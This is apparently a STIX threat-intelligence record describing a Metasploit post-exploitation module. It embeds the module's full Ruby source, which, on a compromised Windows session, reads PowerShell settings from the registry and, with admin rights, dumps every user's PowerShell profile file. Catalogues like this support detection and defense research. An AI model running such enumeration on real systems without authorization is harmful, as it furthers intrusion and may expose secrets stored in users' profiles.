{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f13d8301-6595-498d-b660-eaba1cb6a6df",
    "created": "2024-08-14T16:33:05.016099Z",
    "modified": "2024-08-14T16:33:05.016103Z",
    "name": "Windows Gather PowerShell Environment Setting Enumeration",
    "description": "This module will enumerate Microsoft PowerShell settings. 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_powershell_env.rb",
            "external_id": "enum_powershell_env.rb"
        },
        {
            "source_name": "reference",
            "url": "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies"
        },
        {
            "source_name": "reference",
            "url": "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather PowerShell Environment Setting Enumeration',\n        'Description' => %q{ This module will enumerate Microsoft PowerShell settings. },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],\n        'Platform' => [ 'win' ],\n        'References' => [\n          ['URL', 'https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies'],\n          ['URL', 'https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles'],\n        ],\n        'SessionTypes' => %w[meterpreter shell powershell],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_sys_config_getenv\n              stdapi_sys_config_getuid\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def enum_users\n    users = []\n\n    system_drive = get_env('SystemDrive').to_s.strip\n\n    path4users = ''\n    if directory?(\"#{system_drive}\\\\Users\")\n      path4users = \"#{system_drive}\\\\Users\\\\\"\n      profilepath = '\\\\Documents\\\\WindowsPowerShell\\\\'\n    elsif directory?(\"#{system_drive}\\\\Documents and Settings\")\n      path4users = \"#{system_drive}\\\\Documents and Settings\\\\\"\n      profilepath = '\\\\My Documents\\\\WindowsPowerShell\\\\'\n    else\n      print_error('Could not find user profile directories')\n      return []\n    end\n\n    if is_system? || is_admin?\n      print_status('Running with elevated privileges. Extracting user list ...')\n      paths = begin\n        dir(path4users)\n      rescue StandardError\n        []\n      end\n\n      ignored = [\n        '.',\n        '..',\n        'All Users',\n        'Default',\n        'Default User',\n        'Public',\n        'desktop.ini',\n        'LocalService',\n        'NetworkService'\n      ]\n      paths.reject { |p| ignored.include?(p) }.each do |u|\n        users << {\n          'username' => u,\n          'userappdata' => path4users + u + profilepath\n        }\n      end\n    else\n      u = get_env('USERNAME')\n      users << {\n        'username' => u,\n        'userappdata' => path4users + u + profilepath\n      }\n    end\n\n    users\n  end\n\n  def enum_powershell_modules\n    powershell_module_path = get_env('PSModulePath')\n    return [] unless powershell_module_path\n\n    paths = powershell_module_path.split(';')\n    print_status('PowerShell Modules paths:')\n    modules = []\n    paths.each do |p|\n      print_status(\"\\t#{p}\")\n\n      path_contents = begin\n        dir(p)\n      rescue StandardError\n        []\n      end\n      path_contents.reject { |m| ['.', '..'].include?(m) }.each do |m|\n        modules << m\n      end\n    end\n\n    modules\n  end\n\n  def enum_powershell\n    unless registry_enumkeys('HKLM\\\\SOFTWARE\\\\Microsoft').include?('PowerShell')\n      print_error('PowerShell is not installed on this system.')\n      return\n    end\n\n    print_status('PowerShell is installed on this system.')\n\n    powershell_version = registry_getvaldata('HKLM\\\\SOFTWARE\\\\Microsoft\\\\PowerShell\\\\1\\\\PowerShellEngine', 'PowerShellVersion')\n    print_status(\"Version: #{powershell_version}\")\n\n    powershell_policy = begin\n      registry_getvaldata('HKLM\\\\SOFTWARE\\\\Microsoft\\\\PowerShell\\\\1\\\\ShellIds\\\\Microsoft.PowerShell', 'ExecutionPolicy')\n    rescue StandardError\n      'Restricted'\n    end\n    print_status(\"Execution Policy: #{powershell_policy}\")\n\n    powershell_path = registry_getvaldata('HKLM\\\\SOFTWARE\\\\Microsoft\\\\PowerShell\\\\1\\\\ShellIds\\\\Microsoft.PowerShell', 'Path')\n    print_status(\"Path: #{powershell_path}\")\n\n    if registry_enumkeys('HKLM\\\\SOFTWARE\\\\Microsoft\\\\PowerShell\\\\1').include?('PowerShellSnapIns')\n      print_status('PowerShell Snap-Ins:')\n      registry_enumkeys('HKLM\\\\SOFTWARE\\\\Microsoft\\\\PowerShell\\\\1\\\\PowerShellSnapIns').each do |si|\n        print_status(\"\\tSnap-In: #{si}\")\n        registry_enumvals(\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\PowerShell\\\\1\\\\PowerShellSnapIns\\\\#{si}\").each do |v|\n          print_status(\"\\t\\t#{v}: #{registry_getvaldata(\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\PowerShell\\\\1\\\\PowerShellSnapIns\\\\#{si}\", v)}\")\n        end\n      end\n    else\n      print_status('No PowerShell Snap-Ins are installed')\n    end\n\n    modules = enum_powershell_modules\n    if modules && !modules.empty?\n      print_status('PowerShell Modules:')\n      modules.each do |m|\n        print_status(\"\\t#{m}\")\n      end\n    else\n      print_status('No PowerShell Modules are installed')\n    end\n\n    profile_file_names = [\n      'profile.ps1',\n      'Microsoft.PowerShell_profile.ps1',\n      'Microsoft.VSCode_profile.ps1',\n    ]\n\n    print_status('Checking if users have PowerShell profiles')\n    enum_users.each do |u|\n      print_status(\"Checking #{u['username']}\")\n\n      app_data_contents = begin\n        dir(u['userappdata'])\n      rescue StandardError\n        []\n      end\n      app_data_contents.map!(&:downcase)\n\n      profile_file_names.each do |profile_file|\n        next unless app_data_contents.include?(profile_file.downcase)\n\n        fname = \"#{u['userappdata']}#{profile_file}\"\n\n        ps_profile = begin\n          read_file(fname)\n        rescue StandardError\n          nil\n        end\n        next unless ps_profile\n\n        print_status(\"Found PowerShell profile '#{fname}' for #{u['username']}:\")\n        print_line(ps_profile.to_s)\n      end\n    end\n  end\n\n  def run\n    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']\n    print_status(\"Running module against #{hostname} (#{session.session_host})\")\n    enum_powershell\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}